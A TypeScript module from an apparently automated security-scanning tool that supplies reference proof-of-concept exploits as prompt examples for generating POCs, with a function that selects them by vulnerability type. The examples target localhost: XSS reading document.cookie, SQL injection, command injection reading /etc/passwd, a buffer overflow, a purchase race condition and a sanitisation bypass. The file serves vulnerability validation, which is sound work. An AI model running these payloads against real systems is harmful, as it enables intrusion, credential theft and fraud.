/**
 * Reference POC examples indexed by vulnerability category.
 * Used by buildPOCPrompt() to include up to 2 relevant examples per prompt call.
 */

export interface PocOutput {
  language: string;
  code: string;
  setupInstructions: string;
  expectedImpact: string;
  testSteps?: string[];
  prerequisitesHandled?: {
    exploitationDependencies: string;
    reachability: string;
    attackChain: string;
  };
  validated: boolean;
}

export interface PocExample {
  categories: string[];
  example: PocOutput;
}

export const POC_EXAMPLES: readonly PocExample[] = Object.freeze([
  {
    categories: ['xss', 'cross-site-scripting', 'dom', 'reflected', 'stored'],
    example: {
      language: 'html',
      code: `<!DOCTYPE html>
<html>
<body>
  <script>
    // Exploitation dependency: user must be authenticated
    fetch('http://localhost:3000/api/auth/check')
      .then(r => r.json())
      .then(auth => {
        if (!auth.authenticated) { document.body.textContent = 'Must be logged in'; return; }
        // Trigger reflected XSS at exact endpoint from vulnerability.location
        fetch('http://localhost:3000/api/dashboard/search?query=<img src=x onerror=alert(document.cookie)>')
          .then(r => r.text())
          .then(html => { document.getElementById('result').innerHTML = html; });
      });
  </script>
  <div id="result"></div>
</body>
</html>`,
      setupInstructions: '1. Start target: npm start (port 3000)\n2. Create account and log in\n3. Open this HTML file in the same browser session',
      expectedImpact: 'alert() executes showing document.cookie — confirms reflected XSS in authenticated context',
      testSteps: [
        'Verify alert popup appears with cookie value',
        'Check Network tab for the XSS payload in request URL',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'Checks authentication before triggering; setup includes account creation and login.',
        reachability: '/api/dashboard/search requires authentication — handled by setup instructions.',
        attackChain: 'query param → server reflects unsanitised → innerHTML executes injected script',
      },
      validated: false,
    },
  },
  {
    categories: ['sql-injection', 'sqli', 'injection', 'database'],
    example: {
      language: 'javascript',
      code: `const http = require('http');

const payload = "1' OR '1'='1";
const options = {
  hostname: 'localhost', port: 3000,
  path: '/api/users?id=' + encodeURIComponent(payload),
  method: 'GET',
};

http.request(options, (res) => {
  let data = '';
  res.on('data', c => data += c);
  res.on('end', () => console.log('Result:', data));
}).end();`,
      setupInstructions: '1. Ensure target app is running on localhost:3000\n2. Run: node poc.js',
      expectedImpact: 'Returns all users from the database instead of a single row',
      testSteps: [
        'Verify response contains multiple user records',
        'Confirm no error — query executed successfully',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'No special state required.',
        reachability: 'Endpoint is publicly accessible.',
        attackChain: 'query string → unsanitised SQL interpolation → full table returned',
      },
      validated: false,
    },
  },
  {
    categories: ['command-injection', 'os-injection', 'rce'],
    example: {
      language: 'python',
      code: `import requests

payload = {'filename': 'test.txt; cat /etc/passwd'}
response = requests.post('http://localhost:5000/upload', json=payload)
print(response.text)  # Should contain /etc/passwd contents`,
      setupInstructions: '1. pip install requests\n2. Ensure Flask app running on port 5000\n3. python3 poc.py',
      expectedImpact: 'Response includes /etc/passwd contents — arbitrary command execution confirmed',
      testSteps: [
        'Verify "root:x:0:0" appears in response',
        'Confirm status 200 (not an error response)',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'No special state required.',
        reachability: '/upload is publicly accessible.',
        attackChain: 'filename param → shell interpolation → cat /etc/passwd executes',
      },
      validated: false,
    },
  },
  {
    categories: ['buffer-overflow', 'memory-safety', 'heap-overflow', 'stack-overflow'],
    example: {
      language: 'c',
      code: `#include <stdio.h>
#include <string.h>

int main() {
    char buffer[1000];
    memset(buffer, 'A', 999);
    buffer[999] = '\\0';

    // Call vulnerable function — overflows its internal 64-byte buffer
    extern void parse_input(char*);
    parse_input(buffer);
    return 0;
}`,
      setupInstructions: '1. Compile: gcc -fsanitize=address -o poc poc.c vulnerable_app.o\n2. Run: ./poc\n3. Expect ASAN heap/stack-buffer-overflow report',
      expectedImpact: 'Buffer overflow in parse_input() causes crash or ASAN-detected memory corruption',
      testSteps: [
        'Run under AddressSanitizer and confirm heap/stack-buffer-overflow report',
        'Check report points to the correct function and line number',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'Oversized 999-byte input triggers the overflow.',
        reachability: 'parse_input() is called directly.',
        attackChain: 'oversized input → strcpy/memcpy into fixed buffer → overflow',
      },
      validated: false,
    },
  },
  {
    categories: ['race-condition', 'toctou', 'concurrency', 'threading'],
    example: {
      language: 'python',
      code: `import requests, threading

BASE_URL = 'http://localhost:5000'
TOKEN = 'replace-with-actual-token'

def purchase(item_id):
    return requests.post(f'{BASE_URL}/api/purchase',
                         json={'itemId': item_id, 'quantity': 1},
                         headers={'Authorization': f'Bearer {TOKEN}'}).json()

# Set balance to exactly the item price, then race 10 concurrent purchases
requests.post(f'{BASE_URL}/api/test/set-balance', json={'balance': 100},
              headers={'Authorization': f'Bearer {TOKEN}'})

results = []
threads = [threading.Thread(target=lambda: results.append(purchase(123))) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()

successes = [r for r in results if r.get('success')]
balance = requests.get(f'{BASE_URL}/api/balance',
                       headers={'Authorization': f'Bearer {TOKEN}'}).json()['balance']
print(f'Successful purchases: {len(successes)} (expected 1)')
print(f'Final balance: \${balance} (negative = race exploited)')`,
      setupInstructions: '1. pip install requests\n2. Log in and replace TOKEN in poc.py\n3. python3 poc.py',
      expectedImpact: 'Multiple purchases succeed with insufficient funds; final balance is negative',
      testSteps: [
        'Observe more than 1 "successful purchases"',
        'Confirm final balance is negative',
      ],
      prerequisitesHandled: {
        exploitationDependencies: '10 concurrent threads maximise probability of hitting the ~50 ms race window.',
        reachability: '/api/purchase requires authentication — handled by TOKEN setup.',
        attackChain: 'Thread A and B both pass balance check before either deducts → both deduct → balance negative',
      },
      validated: false,
    },
  },
  {
    categories: ['prototype-pollution', 'sparse-array', 'type-confusion'],
    example: {
      language: 'javascript',
      code: `const http = require('http');

// Sparse array — holes bypass sanitisation at arrayUtils.js:67
const sparse = [];
sparse[0] = 'safe';
sparse[100] = '<img src=x onerror=alert(1)>';  // hole from index 1-99

const payload = JSON.stringify({ items: sparse, operation: 'transform' });
const req = http.request(
  { hostname: 'localhost', port: 3000, path: '/api/array/process',
    method: 'POST', headers: { 'Content-Type': 'application/json' } },
  res => {
    let d = '';
    res.on('data', c => d += c);
    res.on('end', () => {
      console.log(d.includes('<img src=x') ? '✓ XSS payload reflected' : '✗ not triggered');
    });
  }
);
req.write(payload); req.end();`,
      setupInstructions: '1. Ensure target Node.js app running on port 3000\n2. node poc.js',
      expectedImpact: 'Unsanitised XSS payload appears in response — sparse array bypassed sanitisation',
      testSteps: [
        'Response contains "<img src=x onerror=alert(1)>" literally',
        'Retry with dense array ["safe", "<img...>"] — should be sanitised (control test)',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'Array must be sparse; POC creates explicit hole at indices 1–99.',
        reachability: '/api/array/process is publicly accessible.',
        attackChain: 'sparse array → map() yields undefined holes → sanitise(undefined) bypasses filter → XSS reflected',
      },
      validated: false,
    },
  },
  {
    categories: ['feature-flag', 'unreachable-code', 'latent-vulnerability'],
    example: {
      language: 'bash',
      code: `#!/bin/bash
# Check reachability first
if [ "$(curl -s http://localhost:8080/api/features | jq -r '.experimental')" = "false" ]; then
  echo "UNREACHABLE: Enable ENABLE_EXPERIMENTAL in config/features.yaml then restart"
  exit 1
fi

# Trigger command injection at experimental_handler.go:234
RESPONSE=$(curl -s -X POST http://localhost:8080/api/experimental/process \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -d 'filename=test.txt; cat /etc/passwd')

echo "$RESPONSE" | grep -q 'root:x:0:0' \\
  && echo "✓ Command injection confirmed" \\
  || echo "✗ Not triggered"`,
      setupInstructions: '1. Start app: ./app start\n2. Enable feature: set ENABLE_EXPERIMENTAL: true in config/features.yaml\n3. Restart: ./app restart\n4. chmod +x poc.sh && ./poc.sh',
      expectedImpact: 'Response contains /etc/passwd if feature is enabled; exits with UNREACHABLE message if disabled',
      testSteps: [
        'Run with feature DISABLED — expect UNREACHABLE message',
        'Enable flag, restart, run again — expect "✓ Command injection confirmed"',
      ],
      prerequisitesHandled: {
        exploitationDependencies: 'No complex dependencies once feature is enabled.',
        reachability: 'Code unreachable by default — POC checks flag and provides instructions to enable it.',
        attackChain: 'feature flag enabled → POST filename param → exec.Command() without sanitisation → shell executes cat /etc/passwd',
      },
      validated: false,
    },
  },
]);

/**
 * Returns up to `maxCount` example POCs relevant to `vulnType`.
 *
 * Matching: `vulnType` is normalised (lower-case, spaces/underscores → hyphens) then
 * compared bidirectionally against each category string via substring inclusion —
 * `normalised.includes(c)` OR `c.includes(normalised)`. A short type like "sql" matches
 * the category "sql-injection" (c.includes(normalised)); a verbose type like
 * "cross-site-scripting" matches "xss" if the category is a substring of the normalised
 * type (normalised.includes(c)). When `vulnType` is itself a common substring (e.g.
 * "injection") it may match multiple category strings in the same or different entries;
 * results are capped by `maxCount`, so at most that many entries are returned.
 *
 * Returns an empty array when no category matches — irrelevant examples degrade model
 * output quality more than providing no examples at all. Logs a warning in that case
 * so degraded prompts are observable in production.
 */
export function selectPocExamples(vulnType: string, maxCount = 2): readonly PocOutput[] {
  const normalised = vulnType.toLowerCase().replace(/[\s_]/g, '-');
  const matched: PocOutput[] = [];

  for (const entry of POC_EXAMPLES) {
    if (matched.length >= maxCount) break;
    if (entry.categories.some(c => normalised.includes(c) || c.includes(normalised))) {
      matched.push(entry.example);
    }
  }

  if (matched.length === 0) {
    console.warn(`[poc-examples] No matching examples for vulnerability type "${vulnType}" — prompt will have no examples`);
  }
  return matched;
}
